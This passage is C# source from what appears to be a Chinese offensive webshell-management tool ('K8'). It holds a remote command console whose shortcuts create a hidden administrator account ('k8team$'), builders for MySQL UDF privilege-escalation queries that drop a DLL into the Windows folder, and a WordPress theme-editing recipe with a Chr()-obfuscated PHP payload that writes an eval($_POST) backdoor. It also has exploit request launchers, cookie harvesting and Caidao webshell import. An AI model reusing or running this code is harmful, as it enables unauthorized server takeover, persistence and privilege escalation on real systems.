        private void toolStripMenuItem21_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Cut();
                Clipboard.SetDataObject(Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text)).Replace("=", ":="));
                this.txt_EncodeDecodeText.Paste();
            }
        }

        private void toolStripMenuItem22_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Cut();
                Clipboard.SetDataObject(Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text)).Replace("/", @"\\"));
                this.txt_EncodeDecodeText.Paste();
            }
        }

        private void toolStripMenuItem23_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Cut();
                Clipboard.SetDataObject(Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text)).Replace(@"\\", "/"));
                this.txt_EncodeDecodeText.Paste();
            }
        }

        private void toolStripMenuItem24_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Cut();
                Clipboard.SetDataObject(Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text)).Replace("/", @"\"));
                this.txt_EncodeDecodeText.Paste();
            }
        }

        private void toolStripMenuItem25_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Cut();
                Clipboard.SetDataObject(Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text)).Replace(@"\", "/"));
                this.txt_EncodeDecodeText.Paste();
            }
        }

        private void tv_dirList_AfterSelect(object sender, TreeViewEventArgs e)
        {
        }

        private void tv_dirList_DoubleClick(object sender, EventArgs e)
        {
            TreeNode nodeAt = this.tv_dirList.GetNodeAt(this.pi);
            if ((this.pi.X < nodeAt.Bounds.Left) || (this.pi.X > nodeAt.Bounds.Right))
            {
                this.WebFileCurPath = this.tv_dirList.SelectedNode.Text + @":\";
                this.K8_WebFileDirList();
            }
        }

        private void tv_dirList_MouseDown(object sender, MouseEventArgs e)
        {
            this.pi = new Point(e.X, e.Y);
        }

        private void txt_About_TextChanged(object sender, EventArgs e)
        {
        }

        private void txt_EncodeDecodeText_TextChanged(object sender, EventArgs e)
        {
            this.lbl_OriginalLen.Text = "内容长度: " + this.txt_EncodeDecodeText.Text.Length.ToString();
            this.lbl_OriginalLen.Left = (base.Width - this.lbl_OriginalLen.Width) - 0x19;
        }

        private void txt_ExpURL_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyValue == 13)
            {
                this.web_exploit.Navigate(this.txt_ExpURL.Text.Trim());
            }
        }

        private void txt_k8url_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyValue == 13)
            {
                this.rb_none.Checked = true;
                this.Btn_Submit_Click(null, null);
            }
        }

        private void txt_k8url_TextChanged(object sender, EventArgs e)
        {
            this.expDebugUrlChanged = true;
        }

        private void txt_OneShellPath_TextChanged(object sender, EventArgs e)
        {
            this.IsCheckScriptType();
        }

        private void txt_OriginalText_TextChanged(object sender, EventArgs e)
        {
            this.lbl_OriginalLen.Text = this.txt_EncodeDecodeText.Text.Length.ToString();
        }

        private void txt_urlDataOutput_TextChanged(object sender, EventArgs e)
        {
        }

        private void txt_WebCmdResult_KeyDown(object sender, KeyEventArgs e)
        {
            string str = this.WebCurPath + ">";
            if (e.KeyValue == 13)
            {
                e.SuppressKeyPress = true;
                string str2 = this.txt_WebCmdResult.Lines[this.txt_WebCmdResult.Lines.Length - 1];
                string str3 = "";
                try
                {
                    str3 = str2.Substring(str.Length, str2.Length - str.Length).Trim();
                }
                catch (Exception)
                {
                    this.txt_WebCmdResult.AppendText("\r\n\r\n" + str);
                    return;
                }
                if (str3 == "")
                {
                    this.txt_WebCmdResult.AppendText("\r\n\r\n" + str);
                    return;
                }
                if ((((str3 == "我草") | (str3 == "我操")) | (str3 == "草泥码")) | (str3 == "操你妹"))
                {
                    this.txt_WebCmdResult.AppendText("\r\n\r\n  K8: 操你大爷");
                    this.txt_WebCmdResult.AppendText("\r\n\r\n" + str);
                    return;
                }
                if ((str3 == "fuck") | (str3 == "fuckyou"))
                {
                    this.txt_WebCmdResult.AppendText("\r\n\r\n  K8: Fuck你妹");
                    this.txt_WebCmdResult.AppendText("\r\n\r\n" + str);
                    return;
                }
                if (str3 == "蛋疼")
                {
                    this.txt_WebCmdResult.AppendText("\r\n\r\n  K8: 来帮你揉揉");
                    this.txt_WebCmdResult.AppendText("\r\n\r\n" + str);
                    return;
                }
                if (str3 == "搞基")
                {
                    this.txt_WebCmdResult.AppendText("\r\n\r\n  K8: 搞你妹啊搞");
                    this.txt_WebCmdResult.AppendText("\r\n\r\n" + str);
                    return;
                }
                if (str3 == "你妹")
                {
                    this.txt_WebCmdResult.AppendText("\r\n\r\n  K8: 你大爷");
                    this.txt_WebCmdResult.AppendText("\r\n\r\n" + str);
                    return;
                }
                if (str3 == "尼玛")
                {
                    this.txt_WebCmdResult.AppendText("\r\n\r\n  K8: 你妹");
                    this.txt_WebCmdResult.AppendText("\r\n\r\n" + str);
                    return;
                }
                if (str3 == "你大爷")
                {
                    this.txt_WebCmdResult.AppendText("\r\n\r\n  K8: 你老母");
                    this.txt_WebCmdResult.AppendText("\r\n\r\n" + str);
                    return;
                }
                if (str3 == "操你大爷")
                {
                    this.txt_WebCmdResult.AppendText("\r\n\r\n  K8: 操你老母");
                    this.txt_WebCmdResult.AppendText("\r\n\r\n" + str);
                    return;
                }
                if (str3 == "我去")
                {
                    this.txt_WebCmdResult.AppendText("\r\n\r\n  K8: 去你大爷");
                    this.txt_WebCmdResult.AppendText("\r\n\r\n" + str);
                    return;
                }
                if (str3 == "你会搞站不")
                {
                    this.txt_WebCmdResult.AppendText("\r\n\r\n  K8: 我只会搞基");
                    this.txt_WebCmdResult.AppendText("\r\n\r\n" + str);
                    return;
                }
                if (str3 == "搞你大爷")
                {
                    this.txt_WebCmdResult.AppendText("\r\n\r\n  K8: 搞你大大爷");
                    this.txt_WebCmdResult.AppendText("\r\n\r\n" + str);
                    return;
                }
                if (str3 == "哈哈")
                {
                    this.txt_WebCmdResult.AppendText("\r\n\r\n  K8: 哈你个头");
                    this.txt_WebCmdResult.AppendText("\r\n\r\n" + str);
                    return;
                }
                if (((str3 == "k8save") | (str3 == "保存")) | (str3 == "保存结果"))
                {
                    this.TxtWrite(this.txt_WebCmdResult.Text, Application.StartupPath + @"\K8cmdResult.txt");
                    this.txt_WebCmdResult.AppendText("\r\n\r\n  K8: 结果已保存到本程序目录下 K8cmdResult.txt");
                    this.txt_WebCmdResult.AppendText("\r\n\r\n" + str);
                    return;
                }
                if ((((str3 == "cls") | (str3 == "clear")) | (str3 == "清屏")) | (str3 == "清空"))
                {
                    this.txt_WebCmdResult.Clear();
                    this.txt_WebCmdResult.AppendText(" 后门地址: " + this.txt_OneShellPath.Text.Trim() + "\r\n\r\n" + str);
                    return;
                }
                if ((str3.Length > 3) && (str3.Substring(0, 3) == "cd "))
                {
                    this.WebCurPath = str3.Substring(3, str3.Length - 3);
                    this.txt_WebCmdResult.AppendText("\r\n\r\n" + this.WebCurPath + ">");
                    return;
                }
                if ((str3 == "加用户") | (str3 == "添加用户"))
                {
                    this.txt_WebCmdResult.AppendText("\r\n\r\n" + str);
                    if (this.WebCurPath.Substring(0, 1) != "/")
                    {
                        this.K8_BtnExecuteCmd("net user k8team$ k8team!@#? /add");
                    }
                    return;
                }
                if ((str3 == "提权") | (str3 == "getadmin"))
                {
                    this.txt_WebCmdResult.AppendText("\r\n\r\n" + str);
                    this.K8_BtnExecuteCmd("net user k8team$ k8team!@#? /add&net localgroup administrators k8team$ /add");
                    return;
                }
                this.K8_EnterExecuteCMD(str3);
            }
            if (e.KeyCode == Keys.Back)
            {
                int length = this.txt_WebCmdResult.Lines[this.txt_WebCmdResult.Lines.Length - 1].Length;
                if (length == str.Length)
                {
                    e.SuppressKeyPress = true;
                }
                if (length < str.Length)
                {
                    e.SuppressKeyPress = true;
                }
            }
        }

        private void TxtWrite(string text, string filename)
        {
            FileStream stream = new FileStream(filename, FileMode.Create, FileAccess.Write);
            StreamWriter writer = new StreamWriter(stream);
            writer.BaseStream.Seek(0L, SeekOrigin.Begin);
            writer.WriteLine(text);
            writer.Close();
        }

        public void TxtWriteLog(string text, string filename, int encoding)
        {
            FileStream stream;
            StreamWriter writer;
            filename = Environment.CurrentDirectory + @"\" + filename;
            StringBuilder shortPath = new StringBuilder(80);
            GetShortPathName(filename, shortPath, 80);
            if (!System.IO.File.Exists(filename))
            {
                using (stream = new FileStream(filename, FileMode.Create))
                {
                    if (encoding == 1)
                    {
                        using (writer = new StreamWriter(stream, Encoding.Unicode))
                        {
                            writer.WriteLine(text);
                            writer.Flush();
                            writer.Close();
                        }
                    }
                    else if (encoding == 2)
                    {
                        using (writer = new StreamWriter(stream, Encoding.Default))
                        {
                            writer.WriteLine(text);
                            writer.Flush();
                            writer.Close();
                        }
                    }
                    else if (encoding == 3)
                    {
                        using (writer = new StreamWriter(stream, Encoding.UTF8))
                        {
                            writer.WriteLine(text);
                            writer.Flush();
                            writer.Close();
                        }
                    }
                }
            }
            else
            {
                using (stream = new FileStream(filename, FileMode.Append))
                {
                    if (encoding == 1)
                    {
                        using (writer = new StreamWriter(stream, Encoding.Unicode))
                        {
                            writer.WriteLine(text);
                            writer.Flush();
                            writer.Close();
                        }
                    }
                    else if (encoding == 2)
                    {
                        using (writer = new StreamWriter(stream, Encoding.Default))
                        {
                            writer.WriteLine(text);
                            writer.Flush();
                            writer.Close();
                        }
                    }
                    else if (encoding == 3)
                    {
                        using (writer = new StreamWriter(stream, Encoding.UTF8))
                        {
                            writer.WriteLine(text);
                            writer.Flush();
                            writer.Close();
                        }
                    }
                }
            }
        }

        private void uDF提权CHRToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string k8startStr = "select CHAR(";
            string k8endStr = @") into dumpfile 'c:\\windows\\udf.dll';";
            Thread thread = new Thread(() => this.K8readFile2chr("UDF DLL|*.dll", k8startStr, k8endStr));
            thread.SetApartmentState(ApartmentState.STA);
            thread.Start();
        }

        private void uDF提权HexToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string k8startStr = "Select Unhex('";
            string k8endStr = @"') into dumpfile 'c:\\windows\\udf.dll';";
            Thread thread = new Thread(() => this.K8readFile2Hex("UDF DLL|*.dll", k8startStr, k8endStr));
            thread.SetApartmentState(ApartmentState.STA);
            thread.Start();
        }

        private void unicode中文ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Cut();
                Clipboard.SetDataObject(K8crack.UnicodeToChinese(Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text))));
                this.txt_EncodeDecodeText.Paste();
            }
        }

        private void updateToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Thread thread = new Thread(new ThreadStart(this.K8checkUpdate));
            thread.SetApartmentState(ApartmentState.STA);
            thread.Start();
        }

        [DllImport("urlmon.dll", CharSet=CharSet.Ansi)]
        private static extern int UrlMkSetSessionOption(int dwOption, string pBuffer, int dwBufferLength, int dwReserved);
        private void uRL编码GBKToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Cut();
                Clipboard.SetDataObject(K8crack.K8UrlEncodeGB2312(Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text))));
                this.txt_EncodeDecodeText.Paste();
            }
        }

        private void uRL编码UnicodeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Cut();
                Clipboard.SetDataObject(K8crack.K8UrlEncodeUnicode(Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text))));
                this.txt_EncodeDecodeText.Paste();
            }
        }

        private void uRL编码UTF8ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Cut();
                Clipboard.SetDataObject(K8crack.K8UrlEncodeUTF8(Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text))));
                this.txt_EncodeDecodeText.Paste();
            }
        }

        private void uRL编码全部ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Cut();
                Clipboard.SetDataObject(K8crack.K8UrlEncodeAllStr(Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text))));
                this.txt_EncodeDecodeText.Paste();
            }
        }

        private void uRL解码GBKToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Cut();
                Clipboard.SetDataObject(K8crack.K8UrlDecodeGB2312(Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text))));
                this.txt_EncodeDecodeText.Paste();
            }
        }

        private void uRL解码GBKToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Cut();
                Clipboard.SetDataObject(K8crack.K8UrlDecodeUTF8(Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text))));
                this.txt_EncodeDecodeText.Paste();
            }
        }

        private void uRL解码GBKToolStripMenuItem2_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Cut();
                Clipboard.SetDataObject(K8crack.K8UrlDecodeUnicode(Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text))));
                this.txt_EncodeDecodeText.Paste();
            }
        }

        private void web_cookies_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
        {
            this.txt_getHttponlyCookie.Text = this.web_cookie.Document.Cookie;
            this.txt_getCookies.Text = GetCookies(this.txt_cookiesURL.Text);
            foreach (HtmlElement element in this.web_cookie.Document.Links)
            {
                element.SetAttribute("target", "_self");
            }
            foreach (HtmlElement element2 in this.web_cookie.Document.Forms)
            {
                element2.SetAttribute("target", "_self");
            }
        }

        private void web_cookies_NewWindow(object sender, CancelEventArgs e)
        {
            e.Cancel = true;
        }

        private void web_exploit_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
        {
            this.btnEXPclick.Enabled = true;
        }

        private void web_Result_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
        {
            this.Btn_Submit.Enabled = true;
            this.web_expDebugResult.Document.Encoding = this.K8webBrowserEncoding(this.cbb_expDebugCoding.Text.Trim().ToUpper());
            if (this.rb_none.Checked)
            {
            }
        }

        public void WebBrowserGet()
        {
            string str = this.txt_k8url.Text.Trim();
            if (str == "")
            {
                this.Btn_Submit.Enabled = true;
                this.K8msgbox("请先输入目标网址!");
            }
            else
            {
                if (!str.Contains("http://") & !str.Contains("https://"))
                {
                    str = "http://" + str;
                    this.txt_k8url.Text = str;
                }
                str = str + this.txt_addURL.Text.Trim();
                if (this.chk_submitCookies.Checked)
                {
                    this.K8setWebCookie(str, this.txt_submitCookies.Text.Trim());
                }
                string additionalHeaders = "";
                if (this.txt_UserAgent.Text.Trim() != "")
                {
                    additionalHeaders = string.Format("User-Agent: {0}\r\n", this.txt_UserAgent.Text);
                }
                if (this.txt_SubmitData.Text.Trim() != "")
                {
                    this.web_expDebugResult.Navigate(str + this.txt_SubmitData.Text.TrimEnd(new char[0]), "", null, additionalHeaders);
                }
                else if (this.txt_RefererURL.Text.Trim() == "")
                {
                    this.web_expDebugResult.Navigate(str, "", null, additionalHeaders);
                }
                else
                {
                    this.web_expDebugResult.Navigate(str, "", null, "Referer: " + this.txt_RefererURL.Text.Trim() + additionalHeaders);
                }
            }
        }

        public void WebBrowserPost()
        {
            string str = this.txt_k8url.Text.Trim();
            if (str == "")
            {
                this.Btn_Submit.Enabled = true;
                this.K8msgbox("请先输入目标网址!");
            }
            else
            {
                if (!str.Contains("http://") & !str.Contains("https://"))
                {
                    str = "http://" + str;
                    this.txt_k8url.Text = str;
                }
                str = str + this.txt_addURL.Text.Trim();
                if (this.chk_submitCookies.Checked)
                {
                    this.K8setWebCookie(str, this.txt_submitCookies.Text.Trim());
                }
                string str2 = "";
                if (this.txt_UserAgent.Text.Trim() != "")
                {
                    str2 = string.Format("User-Agent: {0}\r\n", this.txt_UserAgent.Text);
                }
                byte[] bytes = Encoding.UTF8.GetBytes(this.txt_SubmitData.Text.Trim());
                string str3 = "Content-Type: application/x-www-form-urlencoded ";
                if (this.txt_RefererURL.Text.Trim() == "")
                {
                    this.web_expDebugResult.Navigate(str, "", bytes, str3 + "\r\n" + str2);
                }
                else
                {
                    this.web_expDebugResult.Navigate(str, "", bytes, (str3 + "Referer: " + this.txt_RefererURL.Text.Trim()) + "\r\n" + str2);
                }
            }
        }

        private void webClinetCookie()
        {
            try
            {
                string address = "http://localhost:1051/WebSite1/admin.aspx";
                WebClient client = new WebClient();
                string s = "k8=k8teams";
                client.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
                client.Headers.Add("Cookies", "loginName=k8teamsssss;");
                byte[] bytes = Encoding.ASCII.GetBytes(s);
                byte[] buffer2 = client.UploadData(address, "POST", bytes);
                string str3 = Encoding.GetEncoding("gb2312").GetString(buffer2);
                this.K8msgbox(str3);
            }
            catch (Exception exception)
            {
                this.K8msgbox(exception.Message);
            }
        }

        private void webCrackToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this.icoBtn_WebShell_Click(null, null);
        }

        public void WebExploitGet(string k8addURL, string k8cookie, string k8sumbitData, string k8referer, string k8userAgent, string k8encode, string k8allowRedirect)
        {
            string str = this.txt_ExpURL.Text.Trim();
            if (str == "")
            {
                this.Btn_Submit.Enabled = true;
                this.K8msgbox("请先输入目标网址!");
            }
            else
            {
                if (!str.Contains("http://") & !str.Contains("https://"))
                {
                    str = "http://" + str;
                    this.txt_ExpURL.Text = str;
                }
                str = str + k8addURL;
                if (k8cookie != "")
                {
                    this.K8setWebExpCookie(str, k8cookie);
                }
                if (k8userAgent != "")
                {
                    k8userAgent = string.Format("User-Agent: {0}\r\n", k8userAgent);
                }
                if (k8sumbitData != "")
                {
                    this.web_exploit.Navigate(str + k8sumbitData, "", null, k8userAgent);
                }
                else if (k8referer == "")
                {
                    this.web_exploit.Navigate(str, "", null, k8userAgent);
                }
                else
                {
                    this.web_exploit.Navigate(str, "", null, "Referer: " + k8referer + k8userAgent);
                }
            }
        }

        public void WebExploitPost(string k8addURL, string k8cookie, string k8sumbitData, string k8referer, string k8userAgent, string k8encode, string k8allowRedirect)
        {
            string str = this.txt_ExpURL.Text.Trim();
            if (str == "")
            {
                this.K8msgbox("请先输入目标网址!");
            }
            else
            {
                if (!str.Contains("http://") & !str.Contains("https://"))
                {
                    str = "http://" + str;
                    this.txt_ExpURL.Text = str;
                }
                str = str + k8addURL;
                if (k8cookie != "")
                {
                    this.K8setWebExpCookie(str, k8cookie);
                }
                if (k8userAgent != "")
                {
                    k8userAgent = string.Format("User-Agent: {0}\r\n", k8userAgent);
                }
                byte[] bytes = Encoding.UTF8.GetBytes(k8sumbitData);
                string str2 = "Content-Type: application/x-www-form-urlencoded ";
                if (k8referer == "")
                {
                    this.web_exploit.Navigate(str, "", bytes, str2 + "\r\n" + k8userAgent);
                }
                else
                {
                    this.web_exploit.Navigate(str, "", bytes, (str2 + "Referer: " + k8referer) + "\r\n" + k8userAgent);
                }
            }
        }

        private void webShellToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this.icoBtn_WebShell_Click(null, null);
        }

        private void wordPress后台主题GetShell相对路径ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Copy();
                string str = Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text));
                StringBuilder builder = new StringBuilder();
                builder.Append("WordPress 后台编辑主题拿Shell:\r\n");
                builder.Append("1 后台-外观-编辑,随便找一个文件插入以下代码 比如404.php \r\n");
                builder.Append("2 代码插在  get_header(); ?>  之前\r\n");
                builder.Append("3 访问主题404.php 就会在目录下生成相应一句话文件\r\n");
                string str2 = "\r\n\r\n默认EXP: content-note.php \r\n\r\nfputs(fopen(Chr(46).Chr(47).Chr(99).Chr(111).Chr(110).Chr(116).Chr(101).Chr(110).Chr(116).Chr(45).Chr(110).Chr(111).Chr(116).Chr(101).Chr(46).Chr(112).Chr(104).Chr(112),w),Chr(60).Chr(63).Chr(112).Chr(104).Chr(112).Chr(32).Chr(64).Chr(101).Chr(118).Chr(97).Chr(108).Chr(40).Chr(36).Chr(95).Chr(80).Chr(79).Chr(83).Chr(84).Chr(91).Chr(116).Chr(111).Chr(109).Chr(93).Chr(41).Chr(63).Chr(62));\r\n";
                string str3 = builder.ToString() + str2 + "\r\n路径：\t" + str;
                string str4 = "";
                str4 = "密文(PHP_ChrString)：\r\n\r\nfputs(fopen(" + K8crack.PHP_ChrCode(str) + ",w),Chr(60).Chr(63).Chr(112).Chr(104).Chr(112).Chr(32).Chr(64).Chr(101).Chr(118).Chr(97).Chr(108).Chr(40).Chr(36).Chr(95).Chr(80).Chr(79).Chr(83).Chr(84).Chr(91).Chr(116).Chr(111).Chr(109).Chr(93).Chr(41).Chr(63).Chr(62));\r\n\r\n";
                this.txt_EncodeDecodeText.AppendText("\r\n\r\n" + this.k8encodeSplit + str3 + "\r\n\r\n" + str4 + this.k8encodeSplit);
            }
        }

        [DllImport("kernel32", CharSet=CharSet.Unicode)]
        private static extern long WritePrivateProfileString(string section, string key, string val, string filePath);
        private void xssAnalysisToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this.icoBtn_XssAnalysis_Click(null, null);
        }

        private void 保存ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this.TxtWriteLog(this.txt_EncodeDecodeText.Text, "coding.txt", 1);
            this.K8msgbox("文本已保存到 Coding.txt");
        }

        private void 不转行前ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Cut();
                string str = Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text));
                TextBox box = new TextBox {
                    Text = str
                };
                string data = "";
                foreach (string str3 in box.Lines)
                {
                    if (str3.Length > 0)
                    {
                        if (str3.Contains("::") && (str3.Substring(0, 2) == "::"))
                        {
                            data = data + str3 + "\r\n";
                        }
                        else
                        {
                            data = data + "@" + str3 + "\r\n";
                        }
                    }
                }
                Clipboard.SetDataObject(data);
                this.txt_EncodeDecodeText.Paste();
            }
        }

        private void 导入菜刀数据ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this.K8inputCaidaoDB();
        }

        private void 发送到DataOutputToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ToolStripDropDownItem item = sender as ToolStripDropDownItem;
            ContextMenuStrip currentParent = item.GetCurrentParent() as ContextMenuStrip;
            string id = currentParent.SourceControl.Name.Split(new char[] { '_' })[1];
            string str2 = "";
            string str = "";
            string str4 = "";
            string str5 = "";
            string str6 = "";
            string str7 = "";
            string str8 = "";
            string str9 = "";
            DataSet idDataSet = BLLk8EXP.GetIdDataSet(id);
            foreach (DataRow row in idDataSet.Tables[0].Rows)
            {
                this.k8appName = row["appName"].ToString();
                this.k8btnName = row["btnName"].ToString();
                this.k8btnTip = row["btnTip"].ToString();
                str2 = row["method"].ToString();
                str = row["cookie"].ToString();
                str4 = row["sumbitData"].ToString();
                str5 = row["referer"].ToString();
                str6 = row["userAgent"].ToString();
                str7 = row["encode"].ToString();
                str8 = row["allowRedirect"].ToString();
                str9 = row["addURL"].ToString();
                this.k8btnName = K8crack.K8expBase64(this.k8btnName, 0);
                this.k8btnTip = K8crack.K8expBase64(this.k8btnTip, 0);
                str = K8crack.K8expBase64(str, 0);
                str4 = K8crack.K8expBase64(str4, 0);
                str5 = K8crack.K8expBase64(str5, 0);
                str6 = K8crack.K8expBase64(str6, 0);
                str9 = K8crack.K8expBase64(str9, 0);
                this.txt_urlDataOutput.Text = this.txt_ExpURL.Text;
                if (str2 == "POST")
                {
                    this.rb_PostDataOut.Checked = true;
                }
                else if (str2 == "GET")
                {
                    this.rb_GetDataOut.Checked = true;
                }
                else
                {
                    this.rb_none.Checked = true;
                }
                this.txt_RefererURL.Text = str5;
                if (str != "")
                {
                    this.chk_submitCookies.Checked = true;
                }
                else
                {
                    this.chk_submitCookies.Checked = false;
                }
                this.txt_sqlDataOutput.Text = str4;
                switch (str7)
                {
                    case "65001":
                        this.cbb_DataOutEncoding.Text = "UTF-8";
                        break;

                    case "936":
                        this.cbb_DataOutEncoding.Text = "GB2312";
                        break;
                }
                if (str8 == "true")
                {
                    this.chk_allowRedirect.Checked = true;
                }
                else if (str8 == "false")
                {
                    this.chk_allowRedirect.Checked = false;
                }
            }
            this.tab_MainForm.SelectedTab = this.tab_MainForm.TabPages["tab_DataOutput"];
        }

        private void 复制BannerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Clipboard.SetDataObject(this.GetMidStr(this.lbl_expDebugInfo.Text, "Banner:", "IP:").Trim(), true);
        }

        private void 复制ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (!this.txt_EncodeDecodeText.SelectedText.Equals(""))
            {
                Clipboard.SetDataObject(this.txt_EncodeDecodeText.SelectedText, true);
            }
        }

        private void 复制地理位置ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Clipboard.SetDataObject(this.GetMidStr(this.lbl_expDebugInfo.Text, "位置:", "|").Trim(), true);
        }

        private void 剪切ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Cut();
            }
        }

        private void 空格20ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Cut();
                Clipboard.SetDataObject(Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text)).Replace(" ", "%20"));
                this.txt_EncodeDecodeText.Paste();
            }
        }

        private void 空格JSP代码ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Cut();
                Clipboard.SetDataObject(Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text)).Replace("/**/", " "));
                this.txt_EncodeDecodeText.Paste();
            }
        }

        private void 空格ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Cut();
                Clipboard.SetDataObject(Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text)).Replace(" ", "/**/"));
                this.txt_EncodeDecodeText.Paste();
            }
        }

        private void 空格URL编码ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Cut();
                Clipboard.SetDataObject(Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text)).Replace(" ", "+"));
                this.txt_EncodeDecodeText.Paste();
            }
        }

        private void 空格URL编码ToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Cut();
                Clipboard.SetDataObject(Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text)).Replace("%20", " "));
                this.txt_EncodeDecodeText.Paste();
            }
        }

        private void 空格URL编码ToolStripMenuItem2_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Cut();
                Clipboard.SetDataObject(Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text)).Replace("+", " "));
                this.txt_EncodeDecodeText.Paste();
            }
        }

        private void 每行前面不带注释ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Cut();
                string str = Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text));
                TextBox box = new TextBox {
                    Text = str
                };
                string data = "";
                foreach (string str3 in box.Lines)
                {
                    if (str3.Length > 0)
                    {
                        if (str3.Contains("::") && (str3.Substring(0, 2) == "::"))
                        {
                            if (data != null)
                            {
                                data = data;
                            }
                            else
                            {
                                data = "";
                            }
                        }
                        else
                        {
                            data = data + "@" + str3 + "\r\n";
                        }
                    }
                }
                Clipboard.SetDataObject(data);
                this.txt_EncodeDecodeText.Paste();
            }
        }

        private void 批量删除ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (MessageBox.Show("您确定要删除选中的Shell吗?\r\n\r\n此操作无法恢复,请谨慎使用!", "友情提示!", MessageBoxButtons.YesNo) == DialogResult.Yes)
            {
                foreach (ListViewItem item in this.lv_webShell.SelectedItems)
                {
                    if (BLLk8shell.DeleteRecord(int.Parse(Convert.ToString(this.lv_webShell.Items[this.lv_webShell.SelectedIndices[0]].SubItems[0].Text))))
                    {
                        item.Remove();
                    }
                }
                this.K8loadWebShellData();
            }
        }

        private void 去掉行首ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
